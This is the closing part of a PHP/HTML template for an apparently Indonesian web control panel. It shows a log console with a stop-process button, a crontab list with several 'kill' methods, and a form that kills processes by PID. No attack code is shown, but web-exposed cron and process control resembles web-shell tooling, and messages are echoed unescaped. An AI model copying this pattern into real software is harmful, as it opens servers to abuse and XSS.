            <?php if (!empty($output_messages)): ?>
                <div class="messages">
                    <?php foreach ($output_messages as $msg): ?>
                        <div class="message success"><?php echo $msg; ?></div>
                    <?php endforeach; ?>
                </div>
            <?php endif; ?>
            <?php if (!empty($error_messages)): ?>
                <div class="messages">
                    <?php foreach ($error_messages as $msg): ?>
                        <div class="message error"><?php echo $msg; ?></div>
                    <?php endforeach; ?>
                </div>
            <?php endif; ?>
            <?php if ($is_active): ?>
                <div class="log-section">
                    <h3>Log Progress (Terminal Console)</h3>
                    <div class="terminal" id="log-content"><?php echo htmlspecialchars($log_content); ?></div>
                    <div class="btn-container">
                        <form method="POST" action="" onsubmit="return confirm('Anda yakin ingin menghentikan proses ini?');" style="margin: 0;">
                            <input type="hidden" name="action" value="stop_protection">
                            <input type="hidden" name="active_menu" value="dynamic_cache_manager">
                            <button type="submit" class="btn btn-stop">Hentikan Proses</button>
                        </form>
                        <button type="button" class="btn btn-refresh" onclick="refreshLog()">Refresh Log</button>
                    </div>
                </div>
            <?php endif; ?>
        <?php elseif ($active_menu === 'cronjob_manager'): ?>
            <div class="form-section">
                <h3>Management Cronjob - Daftar Cronjob Aktif</h3>
                <?php if (!empty($output_messages)): ?>
                    <div class="messages">
                        <?php foreach ($output_messages as $msg): ?>
                            <div class="message success"><?php echo $msg; ?></div>
                        <?php endforeach; ?>
                    </div>
                <?php endif; ?>
                <?php if (!empty($error_messages)): ?>
                    <div class="messages">
                        <?php foreach ($error_messages as $msg): ?>
                            <div class="message error"><?php echo $msg; ?></div>
                        <?php endforeach; ?>
                    </div>
                <?php endif; ?>
                <form method="POST" action="">
                    <input type="hidden" name="action" value="kill_selected_cronjob">
                    <input type="hidden" name="active_menu" value="cronjob_manager">
                    <div class="form-group">
                        <label>Metode Kill:</label>
                        <select name="kill_method" required>
                            <option value="standard">Standard Edit (Hapus line dari crontab)</option>
                            <option value="purge_rebuild">Purge & Rebuild (Hapus semua, rebuild yang tersisa)</option>
                            <option value="disable_lock">Disable via Lock File (Prevent run tanpa hapus)</option>
                            <option value="kill_processes">Kill Processes Only (Hanya proses, bukan cron entry)</option>
                        </select>
                    </div>
                    <div class="table-responsive">
                        <table class="cron-table">
                            <thead>
                                <tr>
                                    <th><input type="checkbox" id="select_all" onclick="toggleAll(this)"></th>
                                    <th>No</th>
                                    <th>Cronjob Line</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php if (!empty($current_crontab_lines)): ?>
                                    <?php foreach ($current_crontab_lines as $index => $line): ?>
                                        <?php if (trim($line) !== ''): ?>
                                            <tr>
                                                <td><input type="checkbox" name="selected_crons[]" value="<?php echo $index; ?>"></td>
                                                <td><?php echo $index + 1; ?></td>
                                                <td><div class="cron-line" title="<?php echo htmlspecialchars($line); ?>"><?php echo htmlspecialchars($line); ?></div></td>
                                            </tr>
                                        <?php endif; ?>
                                    <?php endforeach; ?>
                                <?php else: ?>
                                    <tr>
                                        <td colspan="3">Tidak ada cronjob aktif.</td>
                                    </tr>
                                <?php endif; ?>
                            </tbody>
                        </table>
                    </div>
                    <button type="submit" class="btn btn-stop" onclick="return confirm('Yakin ingin kill cronjob terpilih dengan metode ini?');">Kill Selected Cronjob</button>
                    <?php if ($show_process_killed_button): ?>
                        <button type="submit" name="action" value="process_killed" class="btn btn-stop" onclick="return confirm('Yakin ingin kill proses terkait?');">Process Killed</button>
                    <?php endif; ?>
                </form>
            </div>
        <?php endif; ?>
        <!-- Process Manager Section (Optional) -->
        <?php if (isset($_GET['show_processes'])): ?>
            <div class="form-section">
                <h3>Process Manager</h3>
                <form method="POST">
                    <input type="hidden" name="action" value="kill_process">
                    <input type="hidden" name="active_menu" value="process_manager">
                    <div class="form-group">
                        <label>PID to Kill:</label>
                        <input type="number" name="pid" required>
                    </div>
                    <button type="submit" class="btn btn-stop">Kill Process</button>
                </form>
            </div>
        <?php endif; ?>
    </div>
</body>
</html>
